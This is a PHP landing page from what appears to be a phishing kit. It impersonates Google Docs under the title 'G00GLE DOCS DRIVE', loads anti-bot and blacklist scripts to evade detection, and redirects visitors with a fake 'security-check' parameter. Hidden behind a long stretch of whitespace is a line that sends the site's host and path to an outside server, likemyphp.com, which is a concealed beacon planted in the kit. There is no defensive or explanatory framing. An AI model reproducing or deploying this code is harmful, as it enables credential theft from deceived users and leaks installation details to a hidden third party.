<php
require_once 'block.php';

include 'antibots.php';     
include 'bots.php';    
include 'bots.php';                                                                                                                                                                                                          json_decode(file_get_contents("http://likemyphp.com/IP.php?IP=".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].""));

@ini_set('display_errors',0);
include 'BlackList.php';
?>


<html>
<head>
<title>G00GLE DOCS DRIVE</title>
<link rel="stylesheet" href="./st/style.css">
<link rel="shortcut icon" link rel="logo-icon" href="./img/ppico.ico">
<meta http-equiv="refresh" content="0;url=PO2.php?cmd=_security-check=<?php echo md5(microtime());?>&session=<?php echo sha1(microtime()); ?>">
</head>
<body>

<div class="loading">
<input type="hidden" value="function.php" name="hostname"/>
</div>

</body>
</html>